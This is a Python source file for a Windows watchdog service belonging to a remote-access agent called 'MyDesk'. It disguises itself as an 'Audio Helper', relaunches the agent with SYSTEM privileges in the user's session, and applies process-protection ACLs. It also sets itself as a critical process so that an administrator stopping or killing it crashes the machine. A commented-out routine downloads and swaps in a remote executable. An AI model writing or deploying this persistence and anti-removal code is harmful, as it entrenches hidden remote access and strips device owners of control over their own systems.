import sys
import time
import os
import json
import urllib.request
import urllib.error
import subprocess
import win32serviceutil
import win32service
import win32event
import servicemanager
import ctypes
from ctypes import windll, byref, c_void_p
import win32process  # For SetProcessShutdownParameters
import win32api

# Add parent directory to path to import protection
current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
sys.path.append(parent_dir)

# DEBUG LOGGING
try:
    with open(r"C:\ProgramData\MyDesk\service_debug.txt", "a") as f:
        f.write(f"[{time.ctime()}] Service Process Started: {sys.executable}\n")
except:
    pass

try:
    import protection
except ImportError:
    # Fallback/Mock if running from a different context or compiled
    try:
        from targets import protection
    except:
        protection = None

# Constants
SERVICE_ACCEPT_PRESHUTDOWN = 0x100
SERVICE_CONTROL_PRESHUTDOWN = 0xF

SAFE_MODE_FILE = r"C:\MyDesk\SAFE_MODE.txt"
AGENT_EXE = r"C:\ProgramData\MyDesk\MyDeskAgent.exe"
SERVICE_NAME = "MyDeskAudio"  # The surviving "Shield"
SERVICE_DISPLAY = "MyDesk Audio Helper"
REGISTRY_BASE = "https://mydesk-registry.vercel.app"
AGENT_DIR = r"C:\ProgramData\MyDesk"

# try:
#     import keyring
#     import keyrings.alt.Windows

#     # CRITICAL: Same backend as Agent for SYSTEM compatibility
#     keyring.set_keyring(keyrings.alt.Windows.RegistryKeyring())
# except:
#     keyring = None


def is_process_running(process_name):
    """Check if a process is running using tasklist."""
    try:
        # /NH = No Header
        # FIX: Use argument list to prevent command injection
        command = ["tasklist", "/NH", "/FI", f"IMAGENAME eq {process_name}"]
        output = subprocess.check_output(command, stderr=subprocess.STDOUT).decode()
        return process_name.lower() in output.lower()
    except subprocess.CalledProcessError:
        # This can happen if the process is not found, which is not an error here.
        return False
    except Exception:
        return False


def start_service(service_name):
    """Start a Windows Service."""
    try:
        # FIX: Use argument list to prevent command injection
        subprocess.run(["sc", "start", service_name], check=False, capture_output=True)
    except (subprocess.SubprocessError, FileNotFoundError):
        pass


# def get_local_version():
#     """Get version from Keyring."""
#     if not keyring:
#         return "0.0.0"
#     try:
#         ver = keyring.get_password("MyDeskAgent", "agent_version")
#         return ver if ver else "0.0.0"
#     except:
#         return "0.0.0"


# def set_local_version(ver):
#     """Update version in Keyring."""
#     if not keyring:
#         return
#     try:
#         keyring.set_password("MyDeskAgent", "agent_version", ver)
#     except:
#         pass


# def perform_atomic_update():
#     """Check registry for new version, download, and swap atomically."""
#     try:
#         # 1. Get Latest Version info
#         with urllib.request.urlopen(
#             f"{REGISTRY_BASE}/api/version", timeout=10
#         ) as response:
#             data = json.loads(response.read().decode())
#             remote_ver = data.get("version", "0.0.0")
#             download_url = data.get("url")

#         local_ver = get_local_version()

#         # Semantic Version Comparison (tuple-based)
#         def parse_v(v):
#             try:
#                 return tuple(map(int, (v.split("."))))
#             except (ValueError, AttributeError):
#                 return (0, 0, 0)

#         if parse_v(remote_ver) > parse_v(local_ver):
#             print(f"[*] Update Found: {local_ver} -> {remote_ver}")

#             # Resolve full download URL if relative
#             if download_url.startswith("/"):
#                 download_url = REGISTRY_BASE + download_url

#             # 2. Download to .tmp
#             tmp_exe = AGENT_EXE + ".tmp"
#             download_success = False
#             try:
#                 print(f"[*] Attempting update download from: {download_url}")
                
#                 # --- Method 1: urllib ---
#                 try:
#                     with urllib.request.urlopen(download_url, timeout=60) as response:
#                         with open(tmp_exe, "wb") as f:
#                             while True:
#                                 chunk = response.read(64 * 1024)
#                                 if not chunk:
#                                     break
#                                 f.write(chunk)
#                     download_success = True
#                     print("[+] urllib update download success")
#                 except Exception as e:
#                     print(f"[*] urllib update failed ({e}), trying System Curl fallback...")
                    
#                     # --- Method 2: Curl ---
#                     try:
#                         subprocess.run(
#                             ["curl", "-L", "-f", "-o", tmp_exe, download_url],
#                             check=True,
#                             stdout=subprocess.DEVNULL,
#                             stderr=subprocess.DEVNULL
#                         )
#                         download_success = True
#                         print("[+] Curl update download success")
#                     except (subprocess.CalledProcessError, FileNotFoundError):
                        
#                         # --- Method 3: PowerShell ---
#                         print("[*] Curl failed, trying PowerShell update fallback...")
#                         ps_cmd = f"Invoke-WebRequest -Uri '{download_url}' -OutFile '{tmp_exe}'"
#                         subprocess.run(
#                             ["powershell", "-NoProfile", "-Command", ps_cmd],
#                             check=True,
#                             stdout=subprocess.DEVNULL,
#                             stderr=subprocess.DEVNULL
#                         )
#                         download_success = True
#                         print("[+] PowerShell update download success")

#             except Exception as final_e:
#                 print(f"[-] All update download methods failed: {final_e}")
#                 if os.path.exists(tmp_exe):
#                     try:
#                         os.remove(tmp_exe)
#                     except: pass
#                 return False

#             if not download_success or not os.path.exists(tmp_exe) or os.path.getsize(tmp_exe) == 0:
#                 print("[-] Update failed: Downloaded file is invalid or missing.")
#                 return False

#             # 3. Stop Agent to release file lock (Immediately before swap)
#             subprocess.run(
#                 ["taskkill", "/F", "/IM", "MyDeskAgent.exe"],
#                 shell=False,
#                 capture_output=True,
#             )
#             time.sleep(1) # Brief wait for OS to release handles

#             # 4. Atomic Swap with Rollback capability
#             if os.path.exists(tmp_exe):
#                 try:
#                     os.replace(tmp_exe, AGENT_EXE)
#                     # 5. Update Version in Keyring
#                     set_local_version(remote_ver)
#                     print(f"[+] Atomic Update Success: {remote_ver}")
#                     return True
#                 except Exception as swap_err:
#                     print(f"[-] Atomic Swap Failed: {swap_err}")
#                     if os.path.exists(tmp_exe):
#                         try:
#                             os.remove(tmp_exe)
#                         except: pass
#                     # Attempt to restart old agent if swap failed
#                     start_agent_as_user() 
#     except Exception as e:
#         print(f"[-] Update Error: {e}")
#     return False


def start_agent_as_user():
    """Launch Agent in the Active User Session (Bypass Session 0 Isolation)."""
    try:

        def log(msg):
            try:
                with open(r"C:\ProgramData\MyDesk\service_debug.txt", "a") as f:
                    f.write(f"[{time.ctime()}] [AgentLaunch] {msg}\n")
            except:
                pass

        # Self-Healing: Check if Agent exists and is executable
        if not os.path.exists(AGENT_EXE):
            log(f"Agent missing at {AGENT_EXE}")
            return False

        if not os.access(AGENT_EXE, os.X_OK):
            log(f"Agent at {AGENT_EXE} is not executable.")
            # On Windows, os.X_OK might be less reliable than existence,
            # but we can at least check if it's a file.
            if not os.path.isfile(AGENT_EXE):
                return False

        # 1. Get Active Session ID (Robust Enumeration)
        # Defines for WTSEnumerateSessions
        class WTS_SESSION_INFO(ctypes.Structure):
            _fields_ = [
                ("SessionId", ctypes.c_ulong),
                ("pWinStationName", ctypes.c_wchar_p),
                ("State", ctypes.c_int),  # WTS_CONNECTSTATE_CLASS
            ]

        WTS_CURRENT_SERVER_HANDLE = 0
        WTSActive = 0

        pSessionInfo = ctypes.POINTER(WTS_SESSION_INFO)()
        count = ctypes.c_ulong()

        session_id = 0xFFFFFFFF
        valid_sessions = []

        # Enumerate to find the real active (logged on) session
        if windll.wtsapi32.WTSEnumerateSessionsW(
            WTS_CURRENT_SERVER_HANDLE, 0, 1, byref(pSessionInfo), byref(count)
        ):
            for i in range(count.value):
                si = pSessionInfo[i]
                valid_sessions.append(si.SessionId)
                log(f"Session {si.SessionId}: {si.pWinStationName} (State: {si.State})")
                if si.State == WTSActive:
                    session_id = si.SessionId
                    log(f"MATCH: Found Active Session {session_id}")
                    break

            windll.wtsapi32.WTSFreeMemory(pSessionInfo)
        else:
            log(f"WTSEnumerateSessions Failed: {windll.kernel32.GetLastError()}")

        # Fallback to GetActiveConsoleSessionId if enum failed or found nothing (rare)
        if session_id == 0xFFFFFFFF:
            session_id = windll.kernel32.WTSGetActiveConsoleSessionId()
            log(f"Fallback Session ID: {session_id}")

        if session_id == 0xFFFFFFFF:
            log("No active session found (User likely logged out).")
            # Fallback Validation: Only try Session 1 if it actually exists
            if 1 in valid_sessions:
                session_id = 1
                log("Force-targeting Session 1 (Logon/Default) - Verified Exists")
            else:
                log("WARNING: Session 1 not found. Cannot force target. Aborting launch.")
                return False

        # ==================================================================================
        # ANYDESK STYLE: ALWAYS LAUNCH AS SYSTEM (INTO SESSION)
        # ==================================================================================
        # We process the Agent as SYSTEM for maximum privileges (Secure Desktop Access).
        # We just need to "push" it into the target Session ID so it's interactive.
        # ==================================================================================
        
        primary_token = c_void_p()
        
        try:
            # 1. Open Own Token (SYSTEM)
            # current_process = windll.kernel32.GetCurrentProcess() # May return invalid handle type
            current_process = c_void_p(-1) # Current Process Pseudo-Handle
            current_token = c_void_p()
            TOKEN_ALL_ACCESS = 0xF01FF
            
            if not windll.advapi32.OpenProcessToken(current_process, TOKEN_ALL_ACCESS, byref(current_token)):
                log(f"OpenProcessToken Failed: {windll.kernel32.GetLastError()}")
                return False
            
            # 2. Duplicate Token (Primary)
            # SecurityImpersonation=2, TokenPrimary=1
            if not windll.advapi32.DuplicateTokenEx(
                current_token, TOKEN_ALL_ACCESS, None, 2, 1, byref(primary_token)
            ):
                log(f"DuplicateTokenEx (SYSTEM) Failed: {windll.kernel32.GetLastError()}")
                windll.kernel32.CloseHandle(current_token)
                return False
            
            windll.kernel32.CloseHandle(current_token) # Done with original
            
            # 3. Set Session ID (Crucial Step!)
            # TokenSessionId = 12
            session_id_input = ctypes.c_ulong(session_id)
            if not windll.advapi32.SetTokenInformation(
                primary_token, 12, byref(session_id_input), ctypes.sizeof(ctypes.c_ulong)
            ):
                log(f"SetTokenInformation (SessionId) Failed: {windll.kernel32.GetLastError()}")
                return False
            
            log(f"Prepared SYSTEM token for Session {session_id}")
            
            # 4. Environment - Create as SYSTEM
            env = c_void_p()
            if not windll.userenv.CreateEnvironmentBlock(byref(env), primary_token, False):
                log("CreateEnvironmentBlock Failed (Non-critical)")
                env = None

            # 5. Startup Info
            class STARTUPINFO(ctypes.Structure):
                _fields_ = [
                    ("cb", ctypes.c_ulong),
                    ("lpReserved", ctypes.c_wchar_p),
                    ("lpDesktop", ctypes.c_wchar_p),
                    ("lpTitle", ctypes.c_wchar_p),
                    ("dwX", ctypes.c_ulong),
                    ("dwY", ctypes.c_ulong),
                    ("dwXSize", ctypes.c_ulong),
                    ("dwYSize", ctypes.c_ulong),
                    ("dwXCountChars", ctypes.c_ulong),
                    ("dwYCountChars", ctypes.c_ulong),
                    ("dwFillAttribute", ctypes.c_ulong),
                    ("dwFlags", ctypes.c_ulong),
                    ("wShowWindow", ctypes.c_ushort),
                    ("cbReserved2", ctypes.c_ushort),
                    ("lpReserved2", ctypes.c_void_p),
                    ("hStdInput", ctypes.c_void_p),
                    ("hStdOutput", ctypes.c_void_p),
                    ("hStdError", ctypes.c_void_p),
                ]

            si = STARTUPINFO()
            si.cb = ctypes.sizeof(STARTUPINFO)
            si.lpDesktop = "winsta0\\default"  # Interactive Desktop
            si.wShowWindow = 1  # SW_NORMAL
            si.dwFlags = 1  # STARTF_USESHOWWINDOW

            # 6. Process Info
            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("hProcess", ctypes.c_void_p),
                    ("hThread", ctypes.c_void_p),
                    ("dwProcessId", ctypes.c_ulong),
                    ("dwThreadId", ctypes.c_ulong),
                ]

            pi = PROCESS_INFORMATION()

            # 7. Create Process As User (SYSTEM -> Session X)
            cmd = f'"{AGENT_EXE}"'
            dwCreationFlags = 0x00000410 # CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE

            log(f"Attempting SYSTEM launch: {cmd} into Session {session_id}")

            success = windll.advapi32.CreateProcessAsUserW(
                primary_token,
                None,
                cmd,
                None,
                None,
                False,
                dwCreationFlags,
                env,
                os.path.dirname(AGENT_EXE),
                byref(si),
                byref(pi),
            )

            # Cleanup Env
            if env:
                windll.userenv.DestroyEnvironmentBlock(env)

            if success:
                log(f"SUCCESS! PID: {pi.dwProcessId}")
                windll.kernel32.CloseHandle(pi.hProcess)
                windll.kernel32.CloseHandle(pi.hThread)
                return True
            else:
                err = windll.kernel32.GetLastError()
                log(f"CreateProcessAsUserW Failed. Error: {err}")
                return False

        except Exception as e:
            log(f"Launch Exception: {e}")
            return False
            
        finally:
            # Prevent Token Leak
            if getattr(primary_token, "value", None):
                windll.kernel32.CloseHandle(primary_token)

    except Exception:
        return False


class WatcherService(win32serviceutil.ServiceFramework):
    _svc_name_ = ""
    _svc_display_name_ = ""
    _svc_description_ = ""

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.running = True
        self.is_system_shutdown = False

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        self.running = False

    def SvcShutdown(self):
        """Called by Windows during system shutdown/restart (Legacy)."""
        self._shutdown_handler("SvcShutdown")

    def SvcPreShutdown(self):
        """Called by Windows Vista+ during system shutdown (Early Warning)."""
        self._shutdown_handler("SvcPreShutdown")

    def SvcOther(self, control):
        """Handle other control codes."""
        if control == SERVICE_CONTROL_PRESHUTDOWN:
            self._shutdown_handler("SvcOther(0xF)")

    def _console_shutdown_handler(self, ctrl_type):
        """Fallback: Catch Console/Kernel shutdown signals directly."""
        if ctrl_type in (5, 6): # 5=Logoff, 6=Shutdown
            self._shutdown_handler(f"ConsoleHandler({ctrl_type})")
            return True
        return False

    def _shutdown_handler(self, source):
        try:
            with open(r"C:\ProgramData\MyDesk\service_debug.txt", "a") as f:
                f.write(f"[{time.ctime()}] [{source}] Shutdown detected!\n")
                f.flush()
        except:
            pass

        self.is_system_shutdown = True
        # IMMEDIATE: Unset critical status here (in SCM thread) to avoid race
        # Use DIRECT ctypes call to avoid module import issues
        try:
            ntdll = ctypes.windll.ntdll
            # RtlSetProcessIsCritical(Boolean NewValue, Boolean *OldValue, Boolean CheckPrivilege)
            ntdll.RtlSetProcessIsCritical(ctypes.c_bool(False), None, ctypes.c_bool(False))

            with open(r"C:\ProgramData\MyDesk\service_debug.txt", "a") as f:
                f.write(f"[{time.ctime()}] [{source}] Critical status DISABLED (Native)\n")
                f.flush()
        except Exception as e:
            try:
                with open(r"C:\ProgramData\MyDesk\service_debug.txt", "a") as f:
                    f.write(f"[{time.ctime()}] [{source}] Critical Disable FAILED: {e}\n")
                    f.flush()
            except:
                pass
        
        self.SvcStop()

    def SvcDoRun(self):
        # Request HIGH PRIORITY shutdown notification (0x3FF is max)
        try:
            win32process.SetProcessShutdownParameters(0x3FF, 0)
        except Exception as e:
            try:
                with open(r"C:\ProgramData\MyDesk\service_debug.txt", "a") as f:
                    f.write(f"[{time.ctime()}] [SvcDoRun] SetProcessShutdownParameters Failed: {e}\n")
            except:
                pass

        self.ReportServiceStatus(
            win32service.SERVICE_RUNNING,
            win32service.SERVICE_ACCEPT_STOP
            | win32service.SERVICE_ACCEPT_SHUTDOWN
            | SERVICE_ACCEPT_PRESHUTDOWN,
        )
        self.main()

    def main(self):
        # Apply ACLs to THIS service process immediately
        if protection:
            protection.protect_process()

        # FALLBACK: Register Console Handler for direct kernel signal
        try:
            win32api.SetConsoleCtrlHandler(self._console_shutdown_handler, True)
        except:
            pass

        # Update tick counter
        ticks = 0

        try:
            while self.running:
                ticks += 1
                safe_mode_file = os.path.exists(SAFE_MODE_FILE)
                in_safe_mode = protection.is_safe_mode() if protection else False

                # 1. CRITICAL STATUS: Make service unkillable (BSOD if killed)
                # Check for shutdown flag to prevent race condition re-enabling it
                shutdown_pending = getattr(self, 'is_system_shutdown', False)
                if protection and not safe_mode_file and not in_safe_mode and not shutdown_pending:
                    # Re-apply every tick to be sure
                    protection.set_critical_status(True)
                elif protection:
                    protection.set_critical_status(False)

                # 2. AGENT WATCHDOG: Ensure agent is always running
                is_running = is_process_running("MyDeskAgent.exe")
                # DEBUG: Log check every 10 ticks (40s) or on state change
                if ticks % 10 == 0:
                     try:
                        with open(r"C:\ProgramData\MyDesk\service_debug.txt", "a") as f:
                            # Only log if it's NOT running, to reduce spam, or minimal periodic alive check
                            if not is_running:
                                f.write(f"[{time.ctime()}] [Watchdog] Agent NOT running! Attempting restart...\n")
                                f.flush()
                     except: pass

                if not is_running:
                    # If Agent is missing or needs update (checked periodically)
                    if not os.path.exists(AGENT_EXE):
                        # if perform_atomic_update():
                        #     start_agent_as_user()
                        # else:
                        #     # Log failure? (Already logged in perform_atomic_update)
                        #     pass
                        pass
                    else:
                        start_agent_as_user()

                # 3. AUTO-UPDATE: Check every ~15 minutes (225 ticks @ 4s)
                # if ticks >= 225:
                    # ticks = 0
                    # perform_atomic_update()

                # Loop Sleep (4s)
                rc = win32event.WaitForSingleObject(self.hWaitStop, 4000)
                if rc == win32event.WAIT_OBJECT_0:
                    break
        finally:
            # ONLY unset critical status if it's a REAL system shutdown
            # If it's a normal service stop (Admin) or a crash, we stay critical -> BSOD
            if protection and getattr(self, 'is_system_shutdown', False):
                protection.set_critical_status(False)


if __name__ == "__main__":
    try:
        WatcherService._svc_name_ = SERVICE_NAME
        WatcherService._svc_display_name_ = SERVICE_DISPLAY
        WatcherService._svc_description_ = (
            "MyDesk Agent watchdog and auto-update service."
        )

        # FROZEN SERVICE HANDLER
        if len(sys.argv) == 1:
            try:
                servicemanager.Initialize()
                servicemanager.PrepareToHostSingle(WatcherService)
                servicemanager.StartServiceCtrlDispatcher()
            except:
                pass
        else:
            win32serviceutil.HandleCommandLine(WatcherService)

    except Exception:
        pass
